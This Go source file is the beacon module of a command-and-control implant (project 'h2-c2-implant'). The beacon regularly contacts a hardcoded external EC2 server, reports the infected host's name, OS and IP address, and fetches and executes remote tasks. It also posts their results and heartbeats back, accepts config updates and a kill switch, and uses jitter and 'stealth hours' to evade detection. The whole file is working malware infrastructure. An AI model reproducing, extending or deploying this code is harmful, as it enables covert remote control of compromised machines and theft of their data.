package beacon

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"h2-c2-implant/config"
	"h2-c2-implant/tasks"
	"h2-c2-implant/transport"
	"log"
	"math/big"
	"net"
	"os"
	"runtime"
	"sync"
	"time"
)

type Beacon struct {
	tun *transport.HysteriaTunnel
	cfg *config.Config
	// Enhanced state tracking
	consecutiveFailures int
	currentBackoff      time.Duration
	lastNetworkCheck    time.Time
	lastHeartbeat       time.Time
	killSwitchTriggered bool
	mu                  sync.RWMutex
	ctx                 context.Context
	cancel              context.CancelFunc
	// Network state tracking
	currentNetworkInterface string
	lastNetworkChange       time.Time
}

type TaskRequest struct {
	ImplantID      string            `json:"implant_id"`
	LastSeen       int64             `json:"last_seen"`
	SystemInfo     SystemInfo        `json:"system_info"`
	NetworkState   NetworkState      `json:"network_state"`
	BeaconState    BeaconState       `json:"beacon_state"`
}

type TaskResponse struct {
	Tasks       []tasks.Task      `json:"tasks"`
	Error       string            `json:"error,omitempty"`
	KillSwitch  bool              `json:"kill_switch,omitempty"`
	ConfigUpdate *config.Config   `json:"config_update,omitempty"`
}

type TaskResult struct {
	TaskID    string      `json:"task_id"`
	ImplantID string      `json:"implant_id"`
	Status    string      `json:"status"` // "success", "error", "running"
	Result    interface{} `json:"result,omitempty"`
	Error     string      `json:"error,omitempty"`
	Timestamp int64       `json:"timestamp"`
	Duration  int64       `json:"duration_ms"`
}

type SystemInfo struct {
	Hostname   string `json:"hostname"`
	OS         string `json:"os"`
	Arch       string `json:"arch"`
	Uptime     int64  `json:"uptime"`
	MemoryMB   int    `json:"memory_mb"`
	GoVersion  string `json:"go_version"`
}

type NetworkState struct {
	Interface string    `json:"interface"`
	IPAddress string    `json:"ip_address"`
	LatencyMs int64     `json:"latency_ms"`
	LastCheck time.Time `json:"last_check"`
}

type BeaconState struct {
	ConsecutiveFailures int           `json:"consecutive_failures"`
	CurrentBackoff      time.Duration `json:"current_backoff"`
	LastCheckin         time.Time     `json:"last_checkin"`
	TotalCheckins       int           `json:"total_checkins"`
}

type Heartbeat struct {
	ImplantID    string        `json:"implant_id"`
	Timestamp    int64         `json:"timestamp"`
	Status       string        `json:"status"`
	SystemInfo   SystemInfo    `json:"system_info"`
	NetworkState NetworkState  `json:"network_state"`
	BeaconState  BeaconState   `json:"beacon_state"`
}

func NewBeacon(tun *transport.HysteriaTunnel, cfg *config.Config) *Beacon {
	ctx, cancel := context.WithCancel(context.Background())
	
	b := &Beacon{
		tun:                      tun,
		cfg:                      cfg,
		consecutiveFailures:      0,
		currentBackoff:           0,
		lastNetworkCheck:         time.Now(),
		lastHeartbeat:            time.Now(),
		killSwitchTriggered:      false,
		ctx:                      ctx,
		cancel:                   cancel,
		currentNetworkInterface:  "",
		lastNetworkChange:        time.Now(),
	}
	
	// Initialize network state
	b.detectNetworkChange()
	
	return b
}

func (b *Beacon) Start() {
	log.Printf("[+] Starting enhanced beacon with %ds base interval ±%ds jitter", b.cfg.BaseInterval, b.cfg.Jitter)
	log.Printf("[+] Kill switch: %t, Network aware: %t, Heartbeat: %ds", 
		b.cfg.KillSwitchEnabled, b.cfg.NetworkAware, b.cfg.HeartbeatInterval)
	
	totalCheckins := 0
	
	for {
		// Check for kill switch
		if b.cfg.KillSwitchEnabled && b.isKillSwitchTriggered() {
			log.Printf("[!] Kill switch triggered - shutting down")
			b.Shutdown()
			return
		}
		
		// Check for context cancellation
		select {
		case <-b.ctx.Done():
			log.Printf("[+] Beacon shutdown requested")
			return
		default:
		}
		
		// Calculate dynamic sleep time with backoff and stealth considerations
		sleepDuration := b.calculateSleepDuration()
		
		log.Printf("[+] Sleeping for %v before next checkin (backoff: %v)", 
			sleepDuration, b.currentBackoff)
		
		// Sleep with context awareness
		select {
		case <-b.ctx.Done():
			log.Printf("[+] Beacon shutdown requested during sleep")
			return
		case <-time.After(sleepDuration):
		}
		
		// Detect network changes if enabled
		if b.cfg.NetworkAware {
			b.detectNetworkChange()
		}
		
		// Checkin and pull tasks from D-Panel with retry logic
		if err := b.checkinAndExecuteWithRetry(); err != nil {
			b.handleCheckinFailure(err)
		} else {
			b.handleCheckinSuccess()
			totalCheckins++
		}
		
		// Send heartbeat if needed
		if time.Since(b.lastHeartbeat) > time.Duration(b.cfg.HeartbeatInterval)*time.Second {
			b.sendHeartbeat()
		}
	}
}

func (b *Beacon) Shutdown() {
	b.cancel()
	log.Printf("[+] Beacon shutdown complete")
}

func (b *Beacon) calculateSleepDuration() time.Duration {
	b.mu.RLock()
	defer b.mu.RUnlock()
	
	// Apply stealth mode if current hour is in stealth hours
	currentHour := time.Now().Hour()
	if b.isStealthHour(currentHour) {
		log.Printf("[+] Stealth mode active - doubling interval")
		return time.Duration((b.cfg.BaseInterval*2)+b.calculateJitter()) * time.Second
	}
	
	// Calculate base interval with jitter
	jitter := b.calculateJitter()
	baseDuration := time.Duration(b.cfg.BaseInterval+jitter) * time.Second
	
	// Apply exponential backoff if there are consecutive failures
	if b.currentBackoff > 0 {
		totalDuration := baseDuration + b.currentBackoff
		log.Printf("[+] Applying backoff: %v (base: %v, backoff: %v)", 
			totalDuration, baseDuration, b.currentBackoff)
		return totalDuration
	}
	
	return baseDuration
}

func (b *Beacon) isStealthHour(hour int) bool {
	for _, stealthHour := range b.cfg.StealthHours {
		if hour == stealthHour {
			return true
		}
	}
	return false
}

func (b *Beacon) isKillSwitchTriggered() bool {
	b.mu.RLock()
	defer b.mu.RUnlock()
	return b.killSwitchTriggered
}

func (b *Beacon) handleCheckinFailure(err error) {
	b.mu.Lock()
	defer b.mu.Unlock()
	
	b.consecutiveFailures++
	
	// Calculate exponential backoff
	if b.consecutiveFailures > 0 {
		backoffSeconds := float64(b.cfg.BaseInterval) * 
			float64(b.cfg.BackoffMultiplier) * 
			float64(b.consecutiveFailures)
		
		// Cap at max backoff
		maxBackoffSeconds := float64(b.cfg.MaxBackoff)
		if backoffSeconds > maxBackoffSeconds {
			backoffSeconds = maxBackoffSeconds
		}
		
		b.currentBackoff = time.Duration(backoffSeconds) * time.Second
	}
	
	log.Printf("[-] Checkin failed (%d consecutive failures): %v", b.consecutiveFailures, err)
	log.Printf("[-] Current backoff: %v", b.currentBackoff)
	
	// Check if we've exceeded max retries
	if b.consecutiveFailures >= b.cfg.MaxRetries {
		log.Printf("[!] Max retries (%d) exceeded - entering extended backoff", b.cfg.MaxRetries)
		// Don't exit, just wait longer
	}
}

func (b *Beacon) handleCheckinSuccess() {
	b.mu.Lock()
	defer b.mu.Unlock()
	
	b.consecutiveFailures = 0
	b.currentBackoff = 0
	b.lastNetworkCheck = time.Now()
}

func (b *Beacon) calculateJitter() int {
	if b.cfg.Jitter <= 0 {
		return 0
	}
	
	// Generate random jitter between -Jitter and +Jitter
	n, err := rand.Int(rand.Reader, big.NewInt(int64(b.cfg.Jitter*2+1)))
	if err != nil {
		log.Printf("[-] Failed to generate jitter: %v", err)
		return 0
	}
	
	return int(n.Int64()) - b.cfg.Jitter
}

func (b *Beacon) checkinAndExecuteWithRetry() error {
	var lastErr error
	
	for attempt := 0; attempt <= b.cfg.MaxRetries; attempt++ {
		if attempt > 0 {
			log.Printf("[+] Retry attempt %d/%d", attempt, b.cfg.MaxRetries)
			backoff := time.Duration(float64(b.cfg.BaseInterval)*float64(attempt)*b.cfg.BackoffMultiplier) * time.Second
			if backoff > time.Duration(b.cfg.MaxBackoff)*time.Second {
				backoff = time.Duration(b.cfg.MaxBackoff) * time.Second
			}
			time.Sleep(backoff)
		}
		
		err := b.checkinAndExecute()
		if err == nil {
			return nil
		}
		
		lastErr = err
		log.Printf("[-] Attempt %d failed: %v", attempt+1, err)
	}
	
	return fmt.Errorf("failed after %d attempts: %w", b.cfg.MaxRetries+1, lastErr)
}

func (b *Beacon) checkinAndExecute() error {
	log.Printf("[+] Checking in with D-Panel...")
	
	// Pull pending tasks
	taskList, killSwitch, configUpdate, err := b.pullPendingTasks()
	if err != nil {
		return fmt.Errorf("failed to pull tasks: %w", err)
	}
	
	// Handle kill switch
	if killSwitch {
		b.mu.Lock()
		b.killSwitchTriggered = true
		b.mu.Unlock()
		log.Printf("[!] Kill switch received from server")
		return fmt.Errorf("kill switch activated")
	}
	
	// Handle config update
	if configUpdate != nil {
		b.mu.Lock()
		b.cfg = configUpdate
		b.mu.Unlock()
		log.Printf("[+] Configuration updated from server")
	}

	if len(taskList) == 0 {
		log.Printf("[+] No pending tasks")
		return nil
	}

	log.Printf("[+] Received %d tasks", len(taskList))

	// Execute each task
	for _, task := range taskList {
		log.Printf("[+] Executing task: %s (type: %s)", task.ID, task.Type)
		
		result := tasks.Execute(&task, b.tun)
		
		// Send result back to C2 with retry logic
		if err := b.sendResultWithRetry(result); err != nil {
			log.Printf("[-] Failed to send result for task %s: %v", task.ID, err)
		} else {
			log.Printf("[+] Task %s completed successfully", task.ID)
		}
	}

	return nil
}

func (b *Beacon) pullPendingTasks() ([]tasks.Task, bool, *config.Config, error) {
	// Create enhanced task request with system info
	req := TaskRequest{
		ImplantID:    b.cfg.ImplantID,
		LastSeen:     time.Now().Unix(),
		SystemInfo:   b.gatherSystemInfo(),
		NetworkState: b.gatherNetworkState(),
		BeaconState:  b.gatherBeaconState(),
	}

	reqBody, err := json.Marshal(req)
	if err != nil {
		return nil, false, nil, fmt.Errorf("failed to marshal task request: %w", err)
	}

	// Make request to D-Panel task endpoint
	resp, err := b.tun.MakeRequest("POST", 
		fmt.Sprintf("https://ec2-13-55-232-246.ap-southeast-2.compute.amazonaws.com/api/dpanel/implant/tasks"), 
		bytes.NewReader(reqBody))
	if err != nil {
		return nil, false, nil, fmt.Errorf("task request failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return nil, false, nil, fmt.Errorf("task endpoint returned %d", resp.StatusCode)
	}

	var taskResp TaskResponse
	if err := json.NewDecoder(resp.Body).Decode(&taskResp); err != nil {
		return nil, false, nil, fmt.Errorf("failed to decode task response: %w", err)
	}

	if taskResp.Error != "" {
		return nil, false, nil, fmt.Errorf("task endpoint error: %s", taskResp.Error)
	}

	return taskResp.Tasks, taskResp.KillSwitch, taskResp.ConfigUpdate, nil
}

func (b *Beacon) sendResult(result tasks.TaskResult) error {
	resultBody, err := json.Marshal(result)
	if err != nil {
		return fmt.Errorf("failed to marshal task result: %w", err)
	}

	resp, err := b.tun.MakeRequest("POST",
		fmt.Sprintf("https://ec2-13-55-232-246.ap-southeast-2.compute.amazonaws.com/api/dpanel/implant/result"),
		bytes.NewReader(resultBody))
	if err != nil {
		return fmt.Errorf("result request failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return fmt.Errorf("result endpoint returned %d", resp.StatusCode)
	}

	return nil
}

func (b *Beacon) sendResultWithRetry(result tasks.TaskResult) error {
	var lastErr error
	
	for attempt := 0; attempt <= b.cfg.MaxRetries; attempt++ {
		if attempt > 0 {
			log.Printf("[+] Result retry attempt %d/%d for task %s", attempt, b.cfg.MaxRetries, result.TaskID)
			backoff := time.Duration(float64(b.cfg.BaseInterval)*float64(attempt)*b.cfg.BackoffMultiplier) * time.Second
			if backoff > time.Duration(b.cfg.MaxBackoff)*time.Second {
				backoff = time.Duration(b.cfg.MaxBackoff) * time.Second
			}
			time.Sleep(backoff)
		}
		
		err := b.sendResult(result)
		if err == nil {
			return nil
		}
		
		lastErr = err
		log.Printf("[-] Result attempt %d failed for task %s: %v", attempt+1, result.TaskID, err)
	}
	
	return fmt.Errorf("failed to send result after %d attempts: %w", b.cfg.MaxRetries+1, lastErr)
}

func (b *Beacon) gatherSystemInfo() SystemInfo {
	hostname, _ := os.Hostname()
	var m runtime.MemStats
	runtime.ReadMemStats(&m)
	
	return SystemInfo{
		Hostname:  hostname,
		OS:        runtime.GOOS,
		Arch:      runtime.GOARCH,
		Uptime:    time.Now().Unix(), // Simple uptime (could be improved)
		MemoryMB:  int(m.Sys / 1024 / 1024),
		GoVersion: runtime.Version(),
	}
}

func (b *Beacon) gatherNetworkState() NetworkState {
	b.mu.RLock()
	defer b.mu.RUnlock()
	
	// Get current network interface
	interfaces, err := net.Interfaces()
	if err != nil {
		return NetworkState{
			Interface: "unknown",
			IPAddress: "unknown",
			LatencyMs: 0,
			LastCheck: b.lastNetworkCheck,
		}
	}
	
	var primaryInterface string
	var ipAddress string
	
	// Find first non-loopback interface with an IP
	for _, iface := range interfaces {
		if iface.Flags&net.FlagLoopback == 0 && iface.Flags&net.FlagUp != 0 {
			addrs, err := iface.Addrs()
			if err == nil && len(addrs) > 0 {
				for _, addr := range addrs {
					if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
						if ipnet.IP.To4() != nil {
							primaryInterface = iface.Name
							ipAddress = ipnet.IP.String()
							break
						}
					}
				}
				if primaryInterface != "" {
					break
				}
			}
		}
	}
	
	if primaryInterface == "" {
		primaryInterface = "unknown"
		ipAddress = "unknown"
	}
	
	return NetworkState{
		Interface: primaryInterface,
		IPAddress: ipAddress,
		LatencyMs: 0, // Could be measured with actual ping
		LastCheck: b.lastNetworkCheck,
	}
}

func (b *Beacon) gatherBeaconState() BeaconState {
	b.mu.RLock()
	defer b.mu.RUnlock()
	
	return BeaconState{
		ConsecutiveFailures: b.consecutiveFailures,
		CurrentBackoff:      b.currentBackoff,
		LastCheckin:         b.lastNetworkCheck,
		TotalCheckins:       0, // Could be tracked
	}
}

func (b *Beacon) detectNetworkChange() {
	b.mu.Lock()
	defer b.mu.Unlock()
	
	currentTime := time.Now()
	
	// Only check network periodically (every 5 minutes)
	if currentTime.Sub(b.lastNetworkCheck) < 5*time.Minute {
		return
	}
	
	newNetworkState := b.gatherNetworkState()
	
	if newNetworkState.Interface != b.currentNetworkInterface && b.currentNetworkInterface != "" {
		log.Printf("[!] Network change detected: %s -> %s", b.currentNetworkInterface, newNetworkState.Interface)
		b.lastNetworkChange = currentTime
		// Reset backoff on network change as it might be a connectivity issue
		b.consecutiveFailures = 0
		b.currentBackoff = 0
	}
	
	b.currentNetworkInterface = newNetworkState.Interface
	b.lastNetworkCheck = currentTime
}

func (b *Beacon) sendHeartbeat() error {
	b.mu.Lock()
	b.lastHeartbeat = time.Now()
	b.mu.Unlock()
	
	heartbeat := Heartbeat{
		ImplantID:    b.cfg.ImplantID,
		Timestamp:    time.Now().Unix(),
		Status:       "active",
		SystemInfo:   b.gatherSystemInfo(),
		NetworkState: b.gatherNetworkState(),
		BeaconState:  b.gatherBeaconState(),
	}
	
	heartbeatBody, err := json.Marshal(heartbeat)
	if err != nil {
		return fmt.Errorf("failed to marshal heartbeat: %w", err)
	}
	
	resp, err := b.tun.MakeRequest("POST",
		fmt.Sprintf("https://ec2-13-55-232-246.ap-southeast-2.compute.amazonaws.com/api/dpanel/implant/heartbeat"),
		bytes.NewReader(heartbeatBody))
	if err != nil {
		return fmt.Errorf("heartbeat request failed: %w", err)
	}
	defer resp.Body.Close()
	
	if resp.StatusCode != 200 {
		return fmt.Errorf("heartbeat endpoint returned %d", resp.StatusCode)
	}
	
	log.Printf("[+] Heartbeat sent successfully")
	return nil
}